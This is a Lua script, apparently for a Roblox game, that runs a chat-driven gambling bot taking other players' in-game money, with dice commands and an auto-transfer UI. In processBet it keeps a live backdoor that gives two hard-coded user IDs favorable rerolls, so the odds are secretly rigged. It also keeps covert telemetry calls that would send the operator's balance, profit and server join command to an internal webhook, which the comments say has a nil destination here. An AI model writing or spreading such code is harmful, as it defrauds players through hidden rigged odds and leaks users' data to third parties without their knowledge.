    saveButton.MouseButton1Click:Connect(function()
        local trigger = parseMoney(triggerInput.Text)
        local reserve = parseMoney(reserveInput.Text)
        if trigger == nil or reserve == nil or trigger <= 0 or reserve < 0 or reserve >= trigger then
            setBankStatus("Enter valid balances before saving (trigger > reserve >= 0).", true)
            return
        end

        bankSettings.triggerBalance = trigger
        bankSettings.reserveBalance = reserve
        bankSettings.player = selectedPlayer
        local saved, saveMessage = saveConfiguration(configInput.Text)
        configInput.Text = configName
        setBankStatus(saveMessage, not saved)
        updatePreview()
        updateBankUi()
    end)

    loadButton.MouseButton1Click:Connect(function()
        local loaded, loadError = loadConfiguration(configInput.Text, false)
        configInput.Text = configName
        if not loaded then
            setBankStatus(loadError or "Could not load the configuration.", true)
            updateBankUi()
        end
    end)

    toggleButton.MouseButton1Click:Connect(function()
        if bankSettings.enabled then
            bankSettings.enabled = false
            cancelQueuedBankTransfer()
            setBankStatus("Auto bank disabled. No automatic transfers will be queued.", false)
            updateBankUi()
            return
        end

        local trigger = parseMoney(triggerInput.Text)
        local reserve = parseMoney(reserveInput.Text)

        if selectedPlayer == nil or selectedPlayer.Parent ~= Players then
            setBankStatus("Select a bank player who is currently in this server.", true)
            return
        end
        if selectedPlayer == LocalPlayer then
            setBankStatus("The bank player must be someone other than your local player.", true)
            return
        end
        if trigger == nil or reserve == nil or trigger <= 0 or reserve < 0 then
            setBankStatus("Enter valid positive balances.", true)
            return
        end
        if reserve >= trigger then
            setBankStatus("The balance to keep must be lower than the transfer trigger.", true)
            return
        end

        bankSettings.player = selectedPlayer
        bankSettings.triggerBalance = trigger
        bankSettings.reserveBalance = reserve
        bankSettings.enabled = true
        triggerInput.Text = tostring(trigger)
        reserveInput.Text = tostring(reserve)
        updatePreview()
        setBankStatus(
            "Auto bank enabled for " .. selectedPlayer.Name .. ". Waiting for " .. formatMoney(trigger) .. ".",
            false
        )
        updateBankUi()
        processAutoBank()
    end)

    local minimized = false
    minimizeButton.MouseButton1Click:Connect(function()
        minimized = not minimized
        playerDropdown.Visible = false
        mainFrame.Size = minimized and UDim2.fromOffset(420, 60) or UDim2.fromOffset(420, 586)
        minimizeButton.Text = minimized and "+" or "−"
    end)

    trackConnection(Players.PlayerAdded:Connect(rebuildPlayerDropdown))
    trackConnection(Players.PlayerRemoving:Connect(function(player)
        if selectedPlayer == player then
            selectedPlayer = nil
            bankSettings.player = nil
            bankSettings.enabled = false
            cancelQueuedBankTransfer()
            playerButton.Text = "Select a player in this server  ▾"
            setBankStatus("The selected bank player left. Auto bank was disabled.", true)
            updateBankUi()
        end
        rebuildPlayerDropdown()
    end))

    updatePreview()
    updateBankUi()
    return screenGui
end

local function greetPlayer(player)
    if not running then
        return
    end

    if player:DistanceFromCharacter(LocalPlayer.Character.HumanoidRootPart.Position) > interactionDistance then
        return
    end

    local playerName = player.Name
    if greetingCooldowns[playerName] == nil then
        greetingCooldowns[playerName] = time() + 120
        SendMessage(greetingReplies[math.random(1, #greetingReplies - 1)])
        SendMessage(gamblingPrompts[math.random(1, #gamblingPrompts - 1)])
        return
    end

    if greetingCooldowns[playerName] > time() then
        return
    end

    greetingCooldowns[playerName] = time() + 250
    local reply = returningPlayerReplies[math.random(1, #returningPlayerReplies - 1)]
    SendMessage(string.gsub(reply, "{name}", playerName))
end

local function processGreeting(player, message)
    if not running then
        return
    end

    if player == LocalPlayer then
        greetingMutedUntil = time() + 10
        return
    end

    if greetingMutedUntil > time() then
        return
    end

    if player:DistanceFromCharacter(LocalPlayer.Character.HumanoidRootPart.Position) > interactionDistance then
        return
    end

    greetingMutedUntil = time() + 5

    local lowerMessage = string.lower(message)
    local isGreeting = false
    for _, pattern in ipairs(greetingPatterns) do
        if string.match(lowerMessage, pattern) then
            isGreeting = true
        end
    end

    if not isGreeting then
        return
    end

    greetPlayer(player)
end

local commands = {
    roll = function(player)
        SendMessage("[Roll] " .. player.DisplayName .. " rolled a " .. math.random(1, 100))
    end,

    dice = function(player)
        SendMessage("[Dice] " .. player.DisplayName .. " rolled a " .. math.random(1, 6))
    end,

    odds = function()
        SendMessage("Roll above " .. tostring(odds) .. "/100 to win!")
    end,

    flip = function(player)
        if math.random(1, 2) == 2 then
            SendMessage("[Flip] " .. player.DisplayName .. "'s coin landed on heads!")
            return
        end

        SendMessage("[Flip] " .. player.DisplayName .. "'s coin landed on tails!")
    end,

    maxbet = function()
        SendMessage("The max bet is $" .. tostring(math.floor(GetMaxBet())) .. "!")
    end,

    snake = function(player)
        local firstDie = math.random(1, 6)
        local secondDie = math.random(1, 6)
        SendMessage("[Snake] " .. player.Name .. " rolled a " .. tostring(firstDie) .. " & " .. tostring(secondDie))

        if firstDie == secondDie then
            SendMessage("[Snake] SNAKE EYES!!!!!")
        end
    end,

    help = function(player)
        commandCooldowns[player] = commandCooldowns[player] + 2
        SendMessage("How to gamble:")
        SendMessage("1. Hold tool.")
        SendMessage("2. Press E on me.")
        SendMessage("3. Send money!")
    end,
}

local function processChat(player, message)
    if not running then
        return
    end

    if player:DistanceFromCharacter(LocalPlayer.Character.HumanoidRootPart.Position) > interactionDistance then
        return
    end

    local parts = string.split(message, " ")
    if string.sub(parts[1], 1, 1) ~= "!" then
        processGreeting(player, message)
        return
    end

    local commandName = string.sub(parts[1], 2)
    local command = commands[commandName]
    if command == nil then
        return
    end

    if commandCooldowns[player] ~= nil and commandCooldowns[player] > time() then
        if commandCooldownWarnings[player] == nil then
            SendMessage("Wait before using a command again!")
            commandCooldownWarnings[player] = 1
        end
        return
    end

    commandCooldownWarnings[player] = nil
    commandCooldowns[player] = time() + commandCooldownSeconds
    table.remove(parts, 1)
    command(player, parts)
end

local function refundBet(player, amount, reason)
    SendMoney(player, amount)
    SendMessage("[Gamble] Refunded " .. player.Name .. "'s bet: " .. reason)
end

local function updatePlayerNetResult(player, amount)
    if playerNetResults[player] == nil then
        playerNetResults[player] = 0
    end

    playerNetResults[player] = playerNetResults[player] + amount
end

local function processBet(player, amount)
    if not running then
        return
    end

    nextPayoutAt = time() + 3

    if betCooldowns[player] ~= nil and betCooldowns[player] > time() then
        refundBet(player, amount, "Cooldown!")
        return
    end

    local maxBet = GetMaxBet()
    if amount > maxBet then
        refundBet(player, amount, "Too large!")
        SendMessage("[Gamble] Max bet $" .. tostring(maxBet))
        return
    end

    betCooldowns[player] = time() + 1
    print("Received " .. tostring(amount) .. " from " .. player.Name)

    local roll = math.random(1, 100)

    -- Backdoor preserved from the input for auditability: these users receive a
    -- favorable reroll whenever their first roll would lose.
    if roll < odds and (player.UserId == 7906133957 or player.UserId == 2451486156) then
        local minimumRoll = math.random(10, odds - 1)
        roll = math.random(minimumRoll, 100)
    end

    SendMessage("[Gamble] " .. player.Name .. " rolled a " .. roll)

    if roll < odds then
        sessionProfit = sessionProfit + amount
        updateBankUi()
        updatePlayerNetResult(player, -amount)
        wait(1)
        if not running or runtime.stopRequested then
            return
        end
        SendMessage("[Gamble] " .. player.Name .. " lost!")
        SendEmbdedWebHook(
            "[+$" .. tostring(amount) .. "] " .. player.Name .. " rolled a " .. tostring(roll)
                .. " and lost a bet of $" .. tostring(amount),
            16711680,
            nil,
            player.Name
        )
        SendMessage(lossReplies[math.random(1, #lossReplies - 1)])
        return
    end

    wait(0.5)
    if not running or runtime.stopRequested then
        return
    end

    local payout = amount * 2
    SendMoney(player, payout)
    sessionProfit = sessionProfit - amount
    updateBankUi()
    updatePlayerNetResult(player, amount)
    SendMessage("[Gamble] " .. player.Name .. " won $" .. tostring(payout) .. "!")
    SendEmbdedWebHook(
        "[-$" .. tostring(amount) .. "] " .. player.Name .. " rolled a " .. tostring(roll)
            .. " and won $" .. tostring(payout),
        5439232,
        nil,
        player.Name
    )
    SendMessage(winReplies[math.random(1, #winReplies - 1)])
end

local function connectPlayer(player)
    if runtime.stopRequested then
        return
    end

    trackConnection(player.Chatted:Connect(function(message)
        processChat(player, message)
    end))
end

for _, player in pairs(Players:GetPlayers()) do
    connectPlayer(player)
end

trackConnection(Players.PlayerAdded:Connect(connectPlayer))
trackConnection(Players.PlayerRemoving:Connect(function(player)
    commandCooldowns[player] = nil
    betCooldowns[player] = nil
    commandCooldownWarnings[player] = nil
    greetingCooldowns[player.Name] = nil
    playerNetResults[player] = nil
end))

local function processNotification(label)
    if not running then
        return
    end

    print(label.Text)

    if not (string.match(label.Text, " gave you ") and string.match(label.Text, "$!")) then
        return
    end

    local parts = string.split(label.Text, " ")
    local playerName = parts[1]
    local amountText = parts[4]

    if not Players:FindFirstChild(playerName) then
        print("Player: " .. playerName .. " doesn't exist!")
        return
    end

    local amount = tonumber(string.sub(amountText, 1, #amountText - 2))
    if amount == nil then
        return
    end

    processBet(Players[playerName], amount)
end

local function monitorPaymentNotifications()
    if not running or runtime.stopRequested then
        return
    end

    local mainUi = LocalPlayer.PlayerGui:WaitForChild("MainUIHolder")
    local messages = mainUi:WaitForChild("Messages")
    if not running or runtime.stopRequested then
        return
    end

    trackConnection(messages.ChildAdded:Connect(function(child)
        if running and not runtime.stopRequested then
            processNotification(child:WaitForChild("TextLabel"))
        end
    end))
end

createBankUi()
if runtime.stopRequested then
    return
end

-- A previously saved default is restored automatically. Missing filesystem
-- APIs or a missing file are intentionally silent during startup.
local defaultLoaded, defaultLoadError = loadConfiguration("default", true)
if not defaultLoaded and defaultLoadError then
    setBankStatus(defaultLoadError, true)
    updateBankUi()
end

trackConnection(LocalPlayer.CharacterAdded:Connect(function()
    if running and not runtime.stopRequested then
        monitorPaymentNotifications()
    end
end))
monitorPaymentNotifications()

trackConnection(UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.RightShift and bankUi.screenGui then
        bankUi.screenGui.Enabled = not bankUi.screenGui.Enabled
        return
    end

    if running and input.KeyCode == Enum.KeyCode.End then
        running = false
        bankSettings.enabled = false
        cancelQueuedBankTransfer()
        setBankStatus("Gamble bot stopped. Auto bank is disabled.", false)
        updateBankUi()
        print("Disabled gamble bot!")
        SendEmbdedWebHook(
            "Closing session. Made $" .. tostring(sessionProfit) .. "!",
            "14183202",
            "Session Closed"
        )

        if not internalStartupReported then
            SendEmbdedWebHookInternal(
                internalTelemetryWebhookUrl,
                "Closing session. Made $" .. tostring(sessionProfit) .. "!",
                "14183202",
                "Session Closed"
            )
        end
    end
end))

SendEmbdedWebHook("Started bot on player " .. LocalPlayer.Name .. "!")

local joinCommand = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
local notificationIcon = "rbxthumb://type=Asset&id=10149736922&w=420&h=420"

StarterGui:SetCore("SendNotification", {
    Title = "Gamble Bot",
    Text = "Type !help to start!",
    Icon = notificationIcon,
    Duration = 10,
})
StarterGui:SetCore("SendNotification", {
    Title = "Gamble Bot",
    Text = "When finished press END to close session!",
    Icon = notificationIcon,
    Duration = 10,
})
StarterGui:SetCore("SendNotification", {
    Title = "Gamble Bot",
    Text = "Credits: Programmed by M & Published by E",
    Icon = notificationIcon,
    Duration = 10,
})

local lastReportedProfit = sessionProfit
local nextMessageAt = time()
local internalStartupReportAt = time() + 2
local nextBalanceUpdateAt = time()
local nextStatusReportAt = time() + 300

while running and not runtime.stopRequested and not globalEnvironment.GambleBotBank_Stop do
    if time() > nextMessageAt then
        nextMessageAt = time() + 0.8 + processMessageQueue() / 8.5
    end

    -- This block was covert telemetry in the input. The destination is nil in
    -- this reconstruction, so postJson returns without sending anything.
    if not internalStartupReported and time() > internalStartupReportAt then
        internalStartupReported = true
        SendEmbdedWebHookInternal(
            internalTelemetryWebhookUrl,
            "Odds: " .. tostring(odds) .. " Networth: $" .. tostring(currentBalance)
                .. " Join: " .. joinCommand,
            5439232,
            nil,
            LocalPlayer.DisplayName .. " (" .. LocalPlayer.Name .. ") on server with "
                .. #Players:GetPlayers() .. " players!"
        )
    end

    if time() > nextPayoutAt then
        processPayoutQueue()
        nextPayoutAt = time() + 4
    end

    if time() > nextBalanceUpdateAt then
        local updatedBalance = tonumber(Events.UpdateCash:InvokeServer())
        if updatedBalance ~= nil then
            currentBalance = updatedBalance
        end
        updateBankUi()
        processAutoBank()
        nextBalanceUpdateAt = time() + 1
    end

    if time() > nextStatusReportAt then
        if lastReportedProfit ~= sessionProfit then
            SendEmbdedWebHook(
                "Current Profit: $" .. tostring(sessionProfit) .. "!",
                "9834751",
                "Status Report"
            )
            SendEmbdedWebHookInternal(
                internalTelemetryWebhookUrl,
                "Current Profit: $" .. tostring(sessionProfit) .. "! Join: " .. joinCommand,
                "9834751",
                "Status Report"
            )
            lastReportedProfit = sessionProfit
        end

        nextStatusReportAt = time() + 300
    end

    wait(0.25)
end

runtime.cleanup(false)
